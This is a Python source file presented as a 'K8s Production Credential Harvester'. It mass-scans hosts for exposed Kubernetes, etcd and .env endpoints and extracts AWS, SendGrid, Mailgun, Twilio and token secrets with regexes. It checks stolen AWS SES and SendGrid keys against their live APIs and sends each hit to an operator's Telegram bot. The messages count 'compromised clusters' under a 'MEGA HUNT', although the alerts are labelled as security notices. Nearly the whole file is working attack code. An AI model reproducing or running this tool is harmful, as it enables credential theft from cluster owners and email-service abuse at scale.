#!/usr/bin/env python3
"""
K8s Production Credential Harvester
Autonomous Kubernetes exploitation module with real-time API verification
Author: wKayaa | Production Ready | 2025-06-24
"""

import asyncio
import aiohttp
import json
import re
import base64
import hmac
import hashlib
import urllib.parse
from datetime import datetime, timezone
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, field
import xml.etree.ElementTree as ET
import logging
import os
import yaml

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

@dataclass
class CredentialResult:
    """Structure for verified credentials"""
    type: str
    key: str
    secret: Optional[str] = None
    verified: bool = False
    permissions: List[str] = field(default_factory=list)
    quota_info: Dict[str, Any] = field(default_factory=dict)
    cluster_source: str = ""
    file_path: str = ""
    verification_time: str = ""

@dataclass
class ClusterTarget:
    """Kubernetes cluster target"""
    endpoint: str
    token: Optional[str] = None
    cert_path: Optional[str] = None
    accessible: bool = False
    privileged_access: bool = False

class CredentialExtractor:
    """Advanced credential extraction with regex patterns"""
    
    PATTERNS = {
        'aws_access_key': r'AKIA[0-9A-Z]{16}',
        'aws_secret_key': r'(?i)(?:secret.{0,20}|key.{0,20})["\']([A-Za-z0-9/+=]{40})["\']',
        'sendgrid_key': r'SG\.[a-zA-Z0-9_-]{22,}\.[a-zA-Z0-9_-]{43,}',
        'mailgun_key': r'key-[0-9a-zA-Z]{32}',
        'mailjet_key': r'[a-f0-9]{32}',
        'twilio_key': r'SK[0-9a-f]{32}',
        'brevo_key': r'xkeysib-[a-z0-9]{64}',
        'jwt_token': r'eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*',
        'bearer_token': r'Bearer\s+([A-Za-z0-9_-]{20,})',
        'api_key_generic': r'(?i)api.?key["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{20,})["\']'
    }
    
    def extract_credentials(self, content: str, source_path: str = "") -> List[Dict[str, str]]:
        """Extract all potential credentials from content"""
        credentials = []
        
        for cred_type, pattern in self.PATTERNS.items():
            matches = re.finditer(pattern, content)
            for match in matches:
                if cred_type == 'aws_secret_key':
                    key_value = match.group(1) if match.groups() else match.group(0)
                else:
                    key_value = match.group(0)
                
                credentials.append({
                    'type': cred_type,
                    'value': key_value,
                    'source': source_path,
                    'line': content[:match.start()].count('\n') + 1
                })
        
        return credentials

    def extract_aws_pairs(self, content: str) -> List[Tuple[str, str]]:
        """Extract AWS access key + secret key pairs"""
        access_keys = re.findall(self.PATTERNS['aws_access_key'], content)
        secret_keys = re.findall(self.PATTERNS['aws_secret_key'], content)
        
        pairs = []
        # Try to match keys that appear close to each other
        for access_key in access_keys:
            for secret_key in secret_keys:
                pairs.append((access_key, secret_key))
        
        return pairs

# ✅ ENHANCED: Perfect Hit Detector with improved filtering
class EnhancedPerfectHitDetector:
    """Enhanced detector for all credential types with false positive reduction"""
    
    def __init__(self):
        self.hit_counter = 0
        # Enhanced patterns with better precision
        self.patterns = {
            'aws_access_key': r'AKIA[0-9A-Z]{16}',
            'aws_secret_key': r'[A-Za-z0-9/+=]{40}',
            'sendgrid_key': r'SG\.[a-zA-Z0-9_-]{22,}\.[a-zA-Z0-9_-]{43,}',
            'jwt_token': r'eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*',
            'bearer_token': r'Bearer\s+([A-Za-z0-9_-]{20,})',
            'api_key': r'(?i)api.?key["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{20,})["\']',
            'password': r'(?i)password["\']?\s*[:=]\s*["\']([^"\']{8,})["\']',
            'secret': r'(?i)secret["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{16,})["\']'
        }
        
        # Enhanced false positive filtering
        self.test_patterns = {
            'AKIAIOSFODNN7EXAMPLE',  # AWS docs example
            'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',  # AWS docs example
            'SG.SENDGRID_API_KEY',  # SendGrid placeholder
            'your-api-key-here',
            'INSERT_YOUR_KEY_HERE',
            'REPLACE_WITH_YOUR_KEY',
            'example-key',
            'test-key',
            'demo-key'
        }
        
        # Context-aware filtering keywords
        self.test_keywords = {'example', 'test', 'demo', 'sample', 'fake', 'dummy', 'placeholder'}
    
    def extract_any_credentials(self, content: str, source_url: str) -> Optional[Dict[str, Any]]:
        """Extract any type of credentials from content with enhanced filtering"""
        try:
            for cred_type, pattern in self.patterns.items():
                matches = re.finditer(pattern, content, re.IGNORECASE)
                for match in matches:
                    credential_value = match.group(0)
                    
                    # Enhanced false positive filtering
                    if self._is_false_positive(credential_value, content, cred_type):
                        continue
                    
                    self.hit_counter += 1
                    confidence = self._calculate_confidence(cred_type, credential_value, content)
                    
                    # Only report high-confidence detections
                    if confidence >= 75.0:
                        return {
                            'type': cred_type,
                            'value': credential_value[:50] + "..." if len(credential_value) > 50 else credential_value,
                            'url': source_url,
                            'confidence': confidence,
                            'hit_id': self.hit_counter,
                            'timestamp': datetime.utcnow().isoformat(),
                            'severity': self._determine_severity(cred_type, confidence, content)
                        }
            return None
        except Exception as e:
            print(f"❌ Detection error: {e}")
            return None
    
    def _is_false_positive(self, value: str, content: str, cred_type: str) -> bool:
        """Enhanced false positive detection"""
        value_lower = value.lower()
        content_lower = content.lower()
        
        # Check against known test patterns
        if value in self.test_patterns:
            return True
        
        # Check for test keywords in value
        for keyword in self.test_keywords:
            if keyword in value_lower:
                return True
        
        # Check for test context indicators
        test_context_indicators = ['example', 'test', 'demo', 'sample', 'placeholder', 'dummy', 'fake']
        for indicator in test_context_indicators:
            if indicator in content_lower:
                return True
        
        # Specific patterns for each credential type
        if cred_type == 'aws_access_key':
            # AWS access keys should start with AKIA and be exactly 20 chars
            if not value.startswith('AKIA') or len(value) != 20:
                return True
        
        elif cred_type == 'aws_secret_key':
            # AWS secret keys should be exactly 40 chars and contain mix of chars
            if len(value) != 40 or value.isdigit() or value.isalpha():
                return True
        
        elif cred_type == 'sendgrid_key':
            # SendGrid keys have specific format
            if not value.startswith('SG.') or len(value) < 69:
                return True
        
        return False
    
    def _determine_severity(self, cred_type: str, confidence: float, content: str) -> str:
        """Determine severity level based on credential type and context"""
        content_lower = content.lower()
        
        # Check for production indicators
        production_indicators = ['production', 'prod', 'live', 'main', 'master']
        is_production = any(indicator in content_lower for indicator in production_indicators)
        
        # High-risk credential types
        high_risk_types = {'aws_access_key', 'aws_secret_key', 'sendgrid_key'}
        
        if confidence >= 95.0 and (cred_type in high_risk_types or is_production):
            return "CRITICAL"
        elif confidence >= 85.0 and cred_type in high_risk_types:
            return "HIGH"
        elif confidence >= 75.0:
            return "MEDIUM"
        else:
            return "LOW"
    
    def _calculate_confidence(self, cred_type: str, value: str, content: str) -> float:
        """Calculate confidence score for detected credential with enhanced analysis"""
        base_score = 70.0
        
        # Type-specific confidence scoring
        if cred_type == 'aws_access_key' and value.startswith('AKIA') and len(value) == 20:
            base_score = 95.0
        elif cred_type == 'sendgrid_key' and value.startswith('SG.') and len(value) >= 69:
            base_score = 90.0
        elif cred_type == 'jwt_token' and value.count('.') == 2:
            base_score = 85.0
        elif cred_type == 'aws_secret_key' and len(value) == 40:
            base_score = 80.0
        
        # Context analysis boost
        sensitive_contexts = ['production', 'prod', 'live', 'api', 'secret', 'key', 'credential']
        for context in sensitive_contexts:
            if context.lower() in content.lower():
                base_score += 5.0
        
        # Proximity analysis - check for related patterns nearby
        if cred_type == 'aws_access_key':
            # Look for secret key patterns nearby
            secret_pattern = r'[A-Za-z0-9/+=]{40}'
            if re.search(secret_pattern, content):
                base_score += 10.0
        
        elif cred_type == 'aws_secret_key':
            # Look for access key patterns nearby
            access_pattern = r'AKIA[0-9A-Z]{16}'
            if re.search(access_pattern, content):
                base_score += 10.0
        
        # File type context boost
        if any(ext in content.lower() for ext in ['.env', 'config', 'credentials', 'secrets']):
            base_score += 8.0
                
        return min(base_score, 99.0)

# ✅ ENHANCED: Telegram Notifier with professional alerting
class TelegramEnhancedNotifier:
    """Enhanced Telegram notifier with professional formatting and severity levels"""
    
    def __init__(self, token: str, chat_id: str):
        self.token = token
        self.chat_id = chat_id
        self.detector = EnhancedPerfectHitDetector()
        self.alert_count = 0
        self.last_alert_time = 0
        print(f"📱 Enhanced Professional Telegram Notifier initialized: Chat {chat_id}")
    
    async def send_any_hit(self, credentials: Dict[str, Any], endpoint: str):
        """Send professional security alert with enhanced formatting"""
        try:
            # Rate limiting check (minimum 5 seconds between alerts)
            current_time = time.time()
            if current_time - self.last_alert_time < 5:
                print(f"📱 Rate limiting: Alert queued")
                return
            
            self.last_alert_time = current_time
            self.alert_count += 1
            
            timestamp = datetime.utcnow().strftime('%H:%M:%S UTC')
            severity = credentials.get('severity', 'MEDIUM')
            
            # Severity-based emoji and formatting
            severity_emojis = {
                'LOW': '⚠️',
                'MEDIUM': '🔸', 
                'HIGH': '🔴',
                'CRITICAL': '🚨'
            }
            
            emoji = severity_emojis.get(severity, '⚠️')
            
            # Professional alert format
            text = f"""{emoji} <b>SECURITY ALERT - {severity}</b> {emoji}

🎯 <b>Alert #{self.alert_count}</b>
🔑 <b>Type:</b> {credentials['type'].replace('_', ' ').title()}
💎 <b>Confidence:</b> {credentials['confidence']:.1f}%
🎯 <b>Severity:</b> {severity}

📍 <b>Location:</b>
• Source: {credentials['url']}
• Endpoint: {endpoint}

🔍 <b>Credential Preview:</b>
<code>{credentials['value']}</code>

🛠️ <b>Recommended Actions:</b>
• Rotate credential immediately
• Review access logs
• Update security policies
• Scan for unauthorized usage

⏰ <b>Detected:</b> {timestamp}
👤 <b>Scanner:</b> wKayaa Enhanced Monitor v2.0
🆔 <b>Hit ID:</b> {credentials['hit_id']}

<i>This is an automated security alert. Immediate action recommended for HIGH/CRITICAL severity.</i>"""
            
            await self._send_telegram_message(text)
            print(f"📱 PROFESSIONAL ALERT SENT: {credentials['type']} [{severity}]")
            
        except Exception as e:
            print(f"📱 ❌ Enhanced alert error: {e}")
    
    async def _send_telegram_message(self, text: str):
        """Send message to Telegram with proper error handling"""
        try:
            url = f"https://api.telegram.org/bot{self.token}/sendMessage"
            data = {
                "chat_id": self.chat_id,
                "text": text,
                "parse_mode": "HTML"
            }
            
            # ✅ FIX: Proper connector configuration without conflicts
            connector = aiohttp.TCPConnector(
                ssl=False,
                keepalive_timeout=30,
                limit=10
            )
            
            async with aiohttp.ClientSession(connector=connector) as session:
                async with session.post(url, json=data, timeout=10) as response:
                    if response.status == 200:
                        print(f"📱 ✅ TELEGRAM SENT - Hit #{self.detector.hit_counter}")
                    else:
                        print(f"📱 ❌ Telegram error: {response.status}")
                        
        except Exception as e:
            print(f"📱 ❌ Telegram exception: {e}")

class AWSCredentialVerifier:
    """Real-time AWS credential verification"""
    
    def __init__(self):
        self.region = 'us-east-1'
    
    def _sign_request(self, method: str, url: str, headers: Dict[str, str], 
                     payload: str, access_key: str, secret_key: str) -> Dict[str, str]:
        """Generate AWS Signature Version 4"""
        # Parse URL
        parsed_url = urllib.parse.urlparse(url)
        host = parsed_url.netloc
        uri = parsed_url.path or '/'
        query = parsed_url.query
        
        # Create canonical request
        canonical_headers = '\n'.join([f'{k.lower()}:{v}' for k, v in sorted(headers.items())]) + '\n'
        signed_headers = ';'.join(sorted([k.lower() for k in headers.keys()]))
        
        payload_hash = hashlib.sha256(payload.encode('utf-8')).hexdigest()
        canonical_request = f"{method}\n{uri}\n{query}\n{canonical_headers}\n{signed_headers}\n{payload_hash}"
        
        # Create string to sign
        timestamp = headers['X-Amz-Date']
        date = timestamp[:8]
        credential_scope = f"{date}/{self.region}/ses/aws4_request"
        string_to_sign = f"AWS4-HMAC-SHA256\n{timestamp}\n{credential_scope}\n{hashlib.sha256(canonical_request.encode('utf-8')).hexdigest()}"
        
        # Calculate signature
        def sign(key, msg):
            return hmac.new(key, msg.encode('utf-8'), hashlib.sha256).digest()
        
        k_date = sign(f"AWS4{secret_key}".encode('utf-8'), date)
        k_region = sign(k_date, self.region)
        k_service = sign(k_region, 'ses')
        k_signing = sign(k_service, 'aws4_request')
        signature = hmac.new(k_signing, string_to_sign.encode('utf-8'), hashlib.sha256).hexdigest()
        
        # Create authorization header
        authorization = f"AWS4-HMAC-SHA256 Credential={access_key}/{credential_scope}, SignedHeaders={signed_headers}, Signature={signature}"
        headers['Authorization'] = authorization
        
        return headers
    
    async def verify_ses_credentials(self, access_key: str, secret_key: str) -> Dict[str, Any]:
        """Verify AWS SES credentials and get quota"""
        try:
            url = f"https://email.{self.region}.amazonaws.com/"
            timestamp = datetime.now(timezone.utc).strftime('%Y%m%dT%H%M%SZ')
            
            headers = {
                'Host': f'email.{self.region}.amazonaws.com',
                'X-Amz-Date': timestamp,
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            
            payload = "Action=GetSendQuota&Version=2010-12-01"
            headers = self._sign_request('POST', url, headers, payload, access_key, secret_key)
            
            # ✅ FIX: Proper connector configuration - no conflict
            connector = aiohttp.TCPConnector(
                ssl=False,
                keepalive_timeout=30,
                limit=10
            )
            
            async with aiohttp.ClientSession(connector=connector) as session:
                async with session.post(url, headers=headers, data=payload, timeout=10) as response:
                    if response.status == 200:
                        content = await response.text()
                        # Parse XML response
                        root = ET.fromstring(content)
                        quota_data = {}
                        for elem in root.iter():
                            if elem.tag.endswith('Max24HourSend'):
                                quota_data['max_24_hour'] = elem.text
                            elif elem.tag.endswith('SentLast24Hours'):
                                quota_data['sent_last_24h'] = elem.text
                            elif elem.tag.endswith('MaxSendRate'):
                                quota_data['max_send_rate'] = elem.text
                        
                        return {
                            'verified': True,
                            'service': 'SES',
                            'quota': quota_data,
                            'permissions': ['ses:GetSendQuota']
                        }
                    else:
                        return {'verified': False, 'error': f'HTTP {response.status}'}
        
        except Exception as e:
            return {'verified': False, 'error': str(e)}

class SendGridVerifier:
    """SendGrid API credential verification"""
    
    async def verify_sendgrid_key(self, api_key: str) -> Dict[str, Any]:
        """Verify SendGrid API key and get account info"""
        try:
            headers = {
                'Authorization': f'Bearer {api_key}',
                'Content-Type': 'application/json'
            }
            
            # ✅ FIX: Proper connector configuration
            connector = aiohttp.TCPConnector(
                ssl=False,
                keepalive_timeout=30,
                limit=10
            )
            
            async with aiohttp.ClientSession(connector=connector) as session:
                # Check user credits
                async with session.get('https://api.sendgrid.com/v3/user/credits', 
                                     headers=headers, timeout=10) as response:
                    if response.status == 200:
                        credits_data = await response.json()
                        
                        # Get verified senders
                        senders = []
                        async with session.get('https://api.sendgrid.com/v3/verified_senders', 
                                             headers=headers, timeout=10) as sender_response:
                            if sender_response.status == 200:
                                sender_data = await sender_response.json()
                                senders = [sender.get('from_email', '') for sender in sender_data.get('results', [])]
                        
                        return {
                            'verified': True,
                            'service': 'SendGrid',
                            'credits': credits_data,
                            'senders': senders,
                            'permissions': ['user:read', 'verified_senders:read']
                        }
                    else:
                        return {'verified': False, 'error': f'HTTP {response.status}'}
        
        except Exception as e:
            return {'verified': False, 'error': str(e)}

# ✅ NEW: Main WWYVQv5TelegramFixed Class
class WWYVQv5TelegramFixed:
    """✅ FIXED: Main class with proper Telegram integration"""
    
    def __init__(self, config, telegram_token=None, telegram_chat_id=None):
        self.config = config
        self.stats = {
            "clusters_scanned": 0,
            "clusters_compromised": 0,
            "secrets_extracted": 0,
            "perfect_hits": 0,
            "session_start": datetime.utcnow().isoformat()
        }
        
        # ✅ FIX: Proper Telegram initialization
        if telegram_token and telegram_chat_id:
            self.telegram = TelegramEnhancedNotifier(telegram_token, telegram_chat_id)
            print("📱 Telegram Enhanced Hits: ENABLED")
        else:
            self.telegram = None
            print("📱 Telegram Enhanced Hits: DISABLED")
    
    async def run_exploitation(self, targets: List[str]) -> Dict[str, Any]:
        """Run complete exploitation with Telegram notifications"""
        print(f"🚀 Starting exploitation of {len(targets)} targets")
        
        # Send start notification
        if self.telegram:
            start_message = f"""🚀 <b>WWYV4Q MEGA HUNT STARTED</b>

📅 {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}
👤 Operator: wKayaa
🎯 Targets: {len(targets)}
⚡ Mode: AGGRESSIVE MEGA SCALE

Ready for Perfect Hits! 💎"""
            
            await self.telegram._send_telegram_message(start_message)
        
        results = {
            "session_id": f"MEGA_{int(datetime.utcnow().timestamp())}",
            "targets_processed": 0,
            "compromised_clusters": {},
            "perfect_hits": [],
            "total_secrets": 0
        }
        
        # ✅ FIX: Proper connector configuration for scanning
        connector = aiohttp.TCPConnector(
            ssl=False,
            keepalive_timeout=30,
            limit=1000,
            limit_per_host=50
        )
        
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=10)
        ) as session:
            
            tasks = []
            for target in targets:
                task = self._scan_target(session, target, results)
                tasks.append(task)
            
            # Process in chunks to avoid overwhelming
            chunk_size = 100
            for i in range(0, len(tasks), chunk_size):
                chunk = tasks[i:i + chunk_size]
                await asyncio.gather(*chunk, return_exceptions=True)
                
                # Update progress
                results["targets_processed"] = min(i + chunk_size, len(targets))
                print(f"📊 Progress: {results['targets_processed']}/{len(targets)} targets processed")
        
        # Final statistics
        self.stats["clusters_scanned"] = len(targets)
        self.stats["clusters_compromised"] = len(results["compromised_clusters"])
        self.stats["perfect_hits"] = len(results["perfect_hits"])
        
        # Send completion notification
        if self.telegram:
            completion_message = f"""✅ <b>MEGA HUNT COMPLETED</b>

📊 <b>Results Summary:</b>
🔍 Targets Scanned: {self.stats['clusters_scanned']}
🔓 Clusters Compromised: {self.stats['clusters_compromised']}
💎 Perfect Hits: {self.stats['perfect_hits']}
🔐 Secrets Found: {results['total_secrets']}

🎯 Session: {results['session_id']}
⏰ Completed: {datetime.utcnow().strftime('%H:%M:%S UTC')}

wKayaa Hunt Complete! 🚀"""
            
            await self.telegram._send_telegram_message(completion_message)
        
        return results
    
    async def _scan_target(self, session: aiohttp.ClientSession, target: str, results: Dict[str, Any]):
        """Scan individual target for vulnerabilities"""
        try:
            # Common K8s ports and endpoints
            ports = [6443, 8443, 8080, 10250, 2379, 2380]
            endpoints = [
                "/api/v1/secrets", "/api/v1/configmaps", "/.env", 
                "/admin", "/metrics", "/debug", "/version",
                "/api/v1/namespaces/kube-system/secrets"
            ]
            
            for port in ports:
                base_url = f"https://{target}:{port}" if port in [6443, 8443] else f"http://{target}:{port}"
                
                for endpoint in endpoints:
                    try:
                        test_url = f"{base_url}{endpoint}"
                        async with session.get(test_url, ssl=False, timeout=5) as response:
                            if response.status == 200:
                                content = await response.text()
                                
                                # Check for credentials
                                if self.telegram:
                                    credentials = self.telegram.detector.extract_any_credentials(content, test_url)
                                    if credentials:
                                        await self.telegram.send_any_hit(credentials, endpoint)
                                        results["total_secrets"] += 1
                                        
                                        # Mark as compromised
                                        if target not in results["compromised_clusters"]:
                                            results["compromised_clusters"][target] = {
                                                "admin_access": True,
                                                "secrets_found": 1,
                                                "endpoints": [endpoint]
                                            }
                                        else:
                                            results["compromised_clusters"][target]["secrets_found"] += 1
                                            results["compromised_clusters"][target]["endpoints"].append(endpoint)
                                        
                                        # Track perfect hits
                                        if endpoint in ["/api/v1/secrets", "/api/v1/namespaces/kube-system/secrets"]:
                                            results["perfect_hits"].append({
                                                "target": target,
                                                "endpoint": endpoint,
                                                "credential_type": credentials["type"]
                                            })
                    
                    except asyncio.TimeoutError:
                        continue
                    except Exception:
                        continue
        
        except Exception as e:
            print(f"❌ Target scan error for {target}: {e}")
    
    def print_summary(self):
        """Print final summary"""
        print("\n" + "="*60)
        print("🚀 WWYV4Q MEGA HUNT SUMMARY")
        print("="*60)
        print(f"📊 Clusters Scanned: {self.stats['clusters_scanned']}")
        print(f"🔓 Clusters Compromised: {self.stats['clusters_compromised']}")
        print(f"💎 Perfect Hits: {self.stats['perfect_hits']}")
        print(f"🔐 Total Secrets: {self.stats['secrets_extracted']}")
        print("="*60)

# ✅ NEW: Export section for the class
__all__ = ['EnhancedPerfectHitDetector', 'TelegramEnhancedNotifier', 'WWYVQv5TelegramFixed', 'CredentialExtractor', 'AWSCredentialVerifier', 'SendGridVerifier']

if __name__ == "__main__":
    print("🚀 Telegram Perfect Hits Module - wKayaa Production")